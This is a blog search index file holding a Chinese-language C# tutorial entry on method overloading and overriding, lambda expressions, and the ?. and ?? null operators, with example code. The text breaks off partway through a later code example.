<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C#语法回顾1</title>
      <link href="/2019/08/26/C#%E8%AF%AD%E6%B3%95%E5%9B%9E%E9%A1%BE1/"/>
      <url>/2019/08/26/C#%E8%AF%AD%E6%B3%95%E5%9B%9E%E9%A1%BE1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="C-重载与重写"><a href="#C-重载与重写" class="headerlink" title="C# 重载与重写"></a>C# 重载与重写</h1><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><p><strong>构造函数：</strong></p><p>构造函数是一种特殊的方法，主要用来创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用再创建对象的语句中。特别的一个类中可有多个构造函数，可根据其参数的不同或参数类型的不同开区分它们，即构造函数的重载。</p><p><strong>重写：</strong></p><p>当一个子类继承一个父类，而子类中的方法与父类中的方法的名称，参数个数，类型都完全一致时，就称子类中的这个方法重写了父类的方法。</p><p><strong>重载：</strong></p><p>一个类中的方法与另一个方法同名，但是其参数表不同，这种方法称之为重载方法。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p><strong>重写：</strong></p><p>通常，派生类继承基类的方法。因此，在调用对象继承方法的时候，调用和执行的是基类的实现。但是，有时需要对派生类中的继承方法有不同的实现。例如，假设动物类存在“跑”的方法，从中派生出马和狗，马和狗的跑得形态是各不相同的，因此同样方法需要两种不同的实现，这就需要”重新编写”基类中的方法。”重写”基类方法就是修改它的实现或者说在派生类中重新编写。</p><p><strong>重载：</strong></p><p>在一个类中用相同的名称但是不同的参数类型创建一个以上的过程、实例构造函数或属性。</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><table><thead><tr><th style="text-align:center">区别\ 名称</th><th style="text-align:center">重载</th><th style="text-align:center">重写</th></tr></thead><tbody><tr><td style="text-align:center">范围</td><td style="text-align:center">同一个类</td><td style="text-align:center">不同的类</td></tr><tr><td style="text-align:center">方法名</td><td style="text-align:center">相同</td><td style="text-align:center">相同</td></tr><tr><td style="text-align:center">参数列表</td><td style="text-align:center">必须不同，与参数列表顺序无关</td><td style="text-align:center">相同</td></tr><tr><td style="text-align:center">修饰符</td><td style="text-align:center">无关</td><td style="text-align:center">大于父类方法</td></tr><tr><td style="text-align:center">抛出父类没有的异常</td><td style="text-align:center">可以</td><td style="text-align:center">不可以</td></tr><tr><td style="text-align:center">返回类型</td><td style="text-align:center">不同</td><td style="text-align:center">相同</td></tr><tr><td style="text-align:center">与面向对象</td><td style="text-align:center">多态</td><td style="text-align:center">继承</td></tr></tbody></table><p><strong>重载特征：</strong> </p><p>I.方法名必须相同 </p><p>II.参数列表必须不相同，与参数列表的顺序无关 </p><p>III.返回值类型可以不相同</p><p>用于在给定了参数列表和一组候选函数成员的情况下，选择一个最佳函数成员来实施调用。 </p><p><strong>重写特征：</strong></p><p>重写就是子类重写父类的方法，在调用的时候，子类的方法会覆盖父类的方法，也就是会调用子类的方法。在父类中的方法必须有修饰符virtual，而在子类的方法中必须指明override；</p><p>发生方法重写的两个方法返回值，方法名，参数列表必须完全一致（必须具有相同的方法名和参数列表，返回值类型必须相同或者其子类）；</p><p>子类抛出的异常不能超过父类相应的方法抛出的异常；</p><p>子类方法的访问级别不能低于父类相应方法的访问级别（public，package，protected， private），不能缩小被重写方法的访问权限；</p><p>方法体不同。</p><p><strong><em>重写格式：</em></strong> </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">父类中： </span><br><span class="line"></span><br><span class="line">public virtual void myMethod()</span><br><span class="line"></span><br><span class="line">{ </span><br><span class="line">  // *********</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line">子类中： </span><br><span class="line"></span><br><span class="line">public override void myMethod() </span><br><span class="line"></span><br><span class="line">{ </span><br><span class="line">  // *********</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>重写以后，用父类对象和子类对象访问myMethod()方法，结果都是访问在子类中重新定义的方法，父类的方法相当于被覆盖掉了。</p><ul><li>子类中为满足自己的需要来重复定义某个方法的不同实现。</li><li>通过使用override关键字来实现覆写。</li><li>只有虚方法和抽象方法才能被覆写。</li></ul><p>要求（<strong>三相同</strong>）即相同的方法名称，相同的参数列表，相同的返回值类型。</p><h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><ul><li>lambda表达式是一个匿名函数，用它可以简化代码，常常用做委托，回调；</li><li>lambda表达式都使用运算符 => ,当见到这个符号，基本上是一个lambda表达式；</li><li>lambda运算符的左边时输入参数(),  =>  ,右边时表达式或语句块；</li><li>lambda表达式，是可以访问到外部变量的，可以将此表达式分配给委托类型；</li></ul><h3 id="Lambda运算符"><a href="#Lambda运算符" class="headerlink" title="Lambda运算符"></a>Lambda运算符</h3><p>​         为研究Lambda表达式，新建一个SimpleLambdaExpression的控制台应用程序。现在，考虑泛型List<t>类型的FindAll()方法，此方法需要System.Predicate<t>的泛型委托，它用于包装任何接受类型为T的输入参数并且返回布尔值的方法。在Program类型中增加一个方法，叫做TraditionalDelegateSyntax()，它与System.Predicate</t></t></p><p><t>类型交互，找出整数List<t>中的偶数。</t></t></p><p><strong>case1: 使用传统委托方式</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line">namespace SimpleLambdaExpression</span><br><span class="line">{</span><br><span class="line">    class Program</span><br><span class="line">    {</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        {</span><br><span class="line">            Console.WriteLine("**** Fun With Lambdas ****");</span><br><span class="line">            TraditionalDelegateSyntax();</span><br><span class="line">            Console.ReadLine();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        static void TraditionalDelegateSyntax()</span><br><span class="line">        {</span><br><span class="line">            // 创建整数列表</span><br><span class="line">            List<int> list = new List<int>();</span><br><span class="line">            list.AddRange(new int[] {20, 1, 4, 8, 9 , 44 });</span><br><span class="line"></span><br><span class="line">            // 使用传统委托语法调用FindAll()</span><br><span class="line">            Predicate<int> callback = new Predicate<int>(IsEvenNumber);</span><br><span class="line">            List<int> evenNumbers = list.FindAll(callback);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine("Here are your even numbers:");</span><br><span class="line">            foreach (int evenNumber in evenNumbers)</span><br><span class="line">            {</span><br><span class="line">                Console.Write("{0} \t", evenNumber);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            Console.WriteLine();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        // Predicate<>委托的目标</span><br><span class="line">        static bool IsEvenNumber(int i)</span><br><span class="line">        {</span><br><span class="line">            // 这是一个偶数吗？</span><br><span class="line">            return (i % 2) == 0;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析：以上代码可以按预期工作，但IsEvenNumber()方法只会在有限的环境中被调用，而且，如果调用FindAll()，就需要完整的方法定义。但如果用匿名方法来代替，代码就简洁许多。考虑下面Program类型的新方法。</p><p><strong>Case2: Program类型的新方法</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static void AnonymousMethodSyntax()</span><br><span class="line">{</span><br><span class="line">    // 建立整数列表</span><br><span class="line">    List<int> list = new List<int>();</span><br><span class="line">    list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 });</span><br><span class="line"></span><br><span class="line">    // 现在使用匿名方法</span><br><span class="line">    List<int> evenNumbers = list.FindAll(delegate(int i) { return (i % 2) == 0; });</span><br><span class="line">    Console.WriteLine("Here are your even numbers:");</span><br><span class="line">    foreach (int evenNumber in evenNumbers)</span><br><span class="line">    {</span><br><span class="line">        Console.Write("{0} \t", evenNumber);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Console.WriteLine();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析：以上的代码并不是首先创建一个Predicate<t>委托类型，然后再编写一个独立方法，而是使用了一个匿名方法。这个方向是正确的，但是仍然需要使用关键字delegate（或者是一个强类型的Predicate<t>），而且还需要保证输入参数是百分百匹配的。我们认为这样的，定义匿名方法的代码还是有些冗长。可以使用Lambda表达式进一步来简化方法FindAll()的调用，使用新的语法时，底层的委托语法将会消失得无影无踪，请看下面的代码：</t></t></p><p><strong>Case3：Lambda表达式</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static void LambdaExpessionSyntax()</span><br><span class="line">{</span><br><span class="line">    // 建立整数列表</span><br><span class="line">    List<int> list = new List<int>();</span><br><span class="line">    list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 });</span><br><span class="line"></span><br><span class="line">    // 现在使用Lambda表达式</span><br><span class="line">    List<int> evenNumbers = list.FindAll(i => (i % 2 == 0));</span><br><span class="line">    foreach (int evenNumber in evenNumbers)</span><br><span class="line">    {</span><br><span class="line">        Console.Write("{0} \t", evenNumber);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Console.WriteLine();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们将奇怪的语句传递给FindAll方法中，这些语句也就是Lambda表达式，这时候不需要用Predicate<t>（或关键字delegate），而只用一个简单的lambda表达式即可。</t></p><p>在深入Lambda表达式之前，我们需要知道Lambda可以应用于任何匿名方法可以应用的场景，而且比匿名方法更节省编码时间。但实际上，C#编译器只是把表达式翻译成使用委托Predicate<t>的普通匿名方法而已（可以使用isdasm.exe和reflector.ex进行验证），如下面的代码：</t></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Lambda表达式</span><br><span class="line"> List<int> evenNumbers = list.FindAll(i => (i % 2 == 0));</span><br><span class="line">被编译进下面的C#代码：</span><br><span class="line">// 变成了匿名方法</span><br><span class="line">List<int> evenNumbers = list.FindAll(delegate(int i) { return (i % 2) == 0; });</span><br></pre></td></tr></tbody></table></figure><h3 id="剖析Lambda表达式"><a href="#剖析Lambda表达式" class="headerlink" title="剖析Lambda表达式"></a>剖析Lambda表达式</h3><p>Lambda形式可以理解为：Arguments ToProcess => StatementsToProcessThem </p><p><code>List<int> evenNumbers = list.FindAll(i => (i % 2 == 0));</code></p><p>// ‘ i ’是参数列表</p><p>// （i % 2 == 0）就是处理“i”的表达式</p><p>Lambda表达式的参数可以是<strong>显式类型化</strong>的也可以是<strong>隐式类型化</strong>的。现在，表示参数i的数据类型（整型）时隐式类型化的。编译器可以根据整个Lambda表达式的上下文和底层委托推断出i是一个整型。尽管如此，我们也可以显式定义表达式每一个参数的类型，如下用包围数据类型和变量即可：</p><p>// 现在，显式的定义参数类型</p><p><code>List<int> evenNumbers = list.FindAll((int i) => (i % 2 == 0));</code></p><p>为保持风格一致，隐式还可以使用括号写成如下：</p><p><code>List<int> evenNumbers = list.FindAll((i) => (i % 2 == 0));</code></p><h3 id="多语句处理参数"><a href="#多语句处理参数" class="headerlink" title="多语句处理参数"></a>多语句处理参数</h3><p>我们第一个Lambda表达式是一个求布尔类型值语句，但是我们知道很多委托目标需要执行多条代码执行，C#允许使用一系列的代码语句来定义Lambda表达式。当表达式必须使用多行代码处理参数时，你可以使用花括号限定范围。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">static void LambdaExpressionSyntax()</span><br><span class="line">{</span><br><span class="line">    // 创建整数列表</span><br><span class="line">    List<int> list = new List<int>();</span><br><span class="line">    list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 });</span><br><span class="line"></span><br><span class="line">    // 现在使用语句块来编写Lambda表达式</span><br><span class="line">    List<int> evenNumbers = list.FindAll((i) =>{</span><br><span class="line">        Console.WriteLine("value of i is currently: {0}",i);</span><br><span class="line">        bool isEven = ((i % 2) == 0);</span><br><span class="line">        return isEven;</span><br><span class="line">    });</span><br><span class="line">    Console.WriteLine("Here are your even numbers:");</span><br><span class="line">    foreach (int evenNumber in evenNumbers)</span><br><span class="line">    {</span><br><span class="line">        Console.Write("{0} \t", evenNumber);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="使用Lambda表达式重写CarDelegate示例"><a href="#使用Lambda表达式重写CarDelegate示例" class="headerlink" title="使用Lambda表达式重写CarDelegate示例"></a>使用Lambda表达式重写CarDelegate示例</h3><p>推荐使用Lambda表达式是因为它为我们提供了一种简单明了的方式进行匿名函数的定义（由此间接地简化了关于委托的编码操作），以Lambda表达式重写CarDelegate示例，以下展示项目的Program类的简化版本，它使用传统的委托语法响应每一个回调：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">{</span><br><span class="line">    Console.WriteLine("**** More Fun With Lambdas ****");</span><br><span class="line">    // 创建一个car对象</span><br><span class="line">    Car c1 = new Car("SlugBug", 100, 10);</span><br><span class="line"></span><br><span class="line">    // 传统的委托语法</span><br><span class="line">    c1.OnAboutToBlow(new Car.AboutToBlow(CarAboutToBlow));</span><br><span class="line">    c1.OnExploded(new Car.Exploded(CarExploded));</span><br><span class="line"></span><br><span class="line">    // 加速（将会激发事件）</span><br><span class="line">    Console.WriteLine("\n **** Speeding Up ****");</span><br><span class="line">    for(int i = 0; i < 6; i++)</span><br><span class="line">        c1.SpeedUp(20);</span><br><span class="line">    Console.ReadLine();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 委托目标</span><br><span class="line">public static void CarAboutToBlow(string msg)</span><br><span class="line">{</span><br><span class="line">    Console.WriteLine(msg);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">public static void CarExploded(string msg)</span><br><span class="line">{</span><br><span class="line">    Console.WriteLine(msg);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用匿名方法重新写的Main();</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">{</span><br><span class="line">    Console.WriteLine("**** More Fun With Lambdas ****");</span><br><span class="line">    // 创建一个car对象</span><br><span class="line">    Car c1 = new Car("SlugBug", 100, 10);</span><br><span class="line"></span><br><span class="line">    // 现在使用匿名方法</span><br><span class="line">    c1.OnAboutToBlow(delegate(string msg){ Console.WriteLine(msg);});</span><br><span class="line">    c1.OnExploded(delegate(string msg){ Console.WriteLine(msg);});</span><br><span class="line"></span><br><span class="line">    // 加速（将会激发事件）</span><br><span class="line">    Console.WriteLine("\n **** Speeding Up ****");</span><br><span class="line">    for(int i = 0; i < 6; i++)</span><br><span class="line">        c1.SpeedUp(20);</span><br><span class="line">    Console.ReadLine();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用Lambda表达式重写Main();</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">{</span><br><span class="line">    Console.WriteLine("**** More Fun With Lambdas ****");</span><br><span class="line">    // 创建一个car对象</span><br><span class="line">    Car c1 = new Car("SlugBug", 100, 10);</span><br><span class="line"></span><br><span class="line">    // 现在使用匿名方法</span><br><span class="line">    c1.OnAboutToBlow(msg => { Console.WriteLine(msg);});</span><br><span class="line">    c1.OnExploded(msg => { Console.WriteLine(msg);});</span><br><span class="line"></span><br><span class="line">    // 加速（将会激发事件）</span><br><span class="line">    Console.WriteLine("\n **** Speeding Up ****");</span><br><span class="line">    for(int i = 0; i < 6; i++)</span><br><span class="line">        c1.SpeedUp(20);</span><br><span class="line">    Console.ReadLine();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="含有多个（或零个）参数的Lambda表达式"><a href="#含有多个（或零个）参数的Lambda表达式" class="headerlink" title="含有多个（或零个）参数的Lambda表达式"></a>含有多个（或零个）参数的Lambda表达式</h3><p>以上都是编写的Lambda表达式都只含有一个参数，实际上，Lambda表达式可以处理多个参数或者不提供任何参数，我们创建一个LambdaExpressionMultiplePrams来说明问题。假设SimpleMath有以下更新：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class SimpleMath</span><br><span class="line">{</span><br><span class="line">    public delegate void MathMessage(string msg, int result);</span><br><span class="line"></span><br><span class="line">    private MathMessage mmDelegate;</span><br><span class="line"></span><br><span class="line">    public delegate string VerySimpleDelegate();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 处理多个参数的Lambda</span><br><span class="line">    public void SetMathHandler(MathMessage target)</span><br><span class="line">    {</span><br><span class="line">        mmDelegate = target;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void Add(int x, int y)</span><br><span class="line">    {</span><br><span class="line">        if (mmDelegate != null)</span><br><span class="line">        {</span><br><span class="line">            mmDelegate.Invoke("Adding has complete!", x + y);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // 处理0个参数的Lambda</span><br><span class="line">    public void SetZeroHandler()</span><br><span class="line">    {</span><br><span class="line">        VerySimpleDelegate v = new VerySimpleDelegate(() => { return "Enjoy your string"; });</span><br><span class="line">        Console.WriteLine(v.Invoke());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到，委托MathMessage需要两个参数，使用Lambda表达式的Main如下所示：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">{</span><br><span class="line">    // 使用Lambda表达式来注册委托</span><br><span class="line">    SimpleMath m = new SimpleMath();</span><br><span class="line"></span><br><span class="line">    m.SetMathHandler((msg, result) =></span><br><span class="line">    {</span><br><span class="line">        Console.WriteLine("Message: {0},Result: {1}", msg, result);</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    // 执行Lambda表达式</span><br><span class="line">    m.Add(100, 10);</span><br><span class="line">    m.SetZeroHandler();</span><br><span class="line">    </span><br><span class="line">    Console.ReadLine();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​        这旨在让我们理解Lambda表达式的整体角色和它是如何以“函数方式”，匿名方法和委托状态共同工作的，尽管需要一些时间来适应新的Lambda表达式（=>）,不过要始终记住Lambda表达式可简化为：Arguments ToProcess => StatementsToProcessThem 的简单形式，并且在LINQ编程模型中使用了许多Lambda表达式来简化代码。</p><h2 id="可空表达式-？"><a href="#可空表达式-？" class="headerlink" title="可空表达式 ？"></a>可空表达式 ？</h2><h3 id="单问号-？"><a href="#单问号-？" class="headerlink" title="单问号 ？"></a><strong>单问号 ？</strong></h3><p>?: 单问号用于对 int,double,bool 等无法直接赋值为 null 的数据类型进行 null 的赋值，意思是这个数据类型是 NullAble 类型的。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int? i = 3 </span><br><span class="line">等同于</span><br><span class="line">Nullable<int> i = new Nullable<int>(3);</span><br><span class="line"></span><br><span class="line">int i; //默认值0</span><br><span class="line">int? ii; //默认值null</span><br></pre></td></tr></tbody></table></figure><p>在此表达式出现之前，当我们得到一个对象并想使用这个对象，需判断该对象是否为null，否则使用对象时就会抛出<code>NullReferenceException</code> 异常（<strong>未将对象引用设置到对象的实例</strong>），如下例：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">{</span><br><span class="line">    var user = GetUser(1);</span><br><span class="line">    if(user == null)</span><br><span class="line">    {</span><br><span class="line">        //这里可以自定义</span><br><span class="line">        throw new NullReferenceException("指定的用户没有找到");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //当 user 对象不是 null 时，我们才可以这样</span><br><span class="line">    var name = user.Name;</span><br><span class="line">    var password = user.Password;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>现在使用可空表达式(?.)，作用就是当对象为null时，就不去访问后面点的对象，如下代码:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string [] args)</span><br><span class="line">{</span><br><span class="line">    var user = GetUser(1);</span><br><span class="line">    var name = user?.Name;</span><br><span class="line">    var password = user?.PassWord;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>?.表达式将声明对象转换成了可为空类型</strong></p><p>上面的代码时字符串，那如果时int类型又会是怎样？</p><p><code>int? age = user?.Age;</code></p><p>数据类型后面加一个问号，表示该类型可以是 null。你可以通过该对象的 <code>HasValue</code> 属性做一个判断，表示该对象有值，然后再使用该对象的 <code>Value</code> 属性获取到值。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int? age = user?.Age;</span><br><span class="line">if(age.HasValue)</span><br><span class="line">{</span><br><span class="line">Console.Write(age.value);    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再举一个例子：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public event EventHandler OnEventChange; // 声明一个事件</span><br><span class="line">//...中间忽略</span><br><span class="line"></span><br><span class="line">//不使用可空表达式时</span><br><span class="line">if(OnEventChange != null) // 判断该时间是否被订阅</span><br><span class="line">{</span><br><span class="line">    OnEventChange();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//使用可空表达式</span><br><span class="line">OnEventChange?.Invoke();</span><br></pre></td></tr></tbody></table></figure><p><strong>总结：</strong></p><p>很明显可空表达式减少了一层判断，明显减少了我们的代码量，也提高了我们的效率。但是需要我们选择性使用，不要滥用。</p><h3 id="双问号"><a href="#双问号" class="headerlink" title="双问号 ??"></a><strong>双问号 ??</strong></h3><p>??: 双问号??可用于在判断一个变量在为null时返回一个指定的值， 具体来讲，??叫做null合并运算符，如果此运算符的左操作数不为 null，则此运算符将返回左操作数；否则返回右操作数。可以用来给变量设置默认值。特别提醒： 记住和空有关的时候，才要去用?? 。如果不会有空的判断，就别用了。因为这个是空的合并运算符。也有人说??是？：的语法糖而已，但是实际上？？进行了很大改进，能够更好的支持表达式。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">namespace CalculatorApplication</span><br><span class="line">{</span><br><span class="line">   class NullablesAtShow</span><br><span class="line">   {</span><br><span class="line">         </span><br><span class="line">      static void Main(string[] args)</span><br><span class="line">      {      </span><br><span class="line">         double? num1 = null;</span><br><span class="line">         double? num2 = 3.14157;</span><br><span class="line">         double num3;</span><br><span class="line">         num3 = num1 ?? 5.34;      // num1 如果为空值则返回 5.34</span><br><span class="line">         Console.WriteLine("num3 的值： {0}", num3);</span><br><span class="line">         num3 = num2 ?? 5.34;</span><br><span class="line">         Console.WriteLine("num3 的值： {0}", num3);  // 返回3.14157</span><br><span class="line">         Console.ReadLine();</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>还有这个例子：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 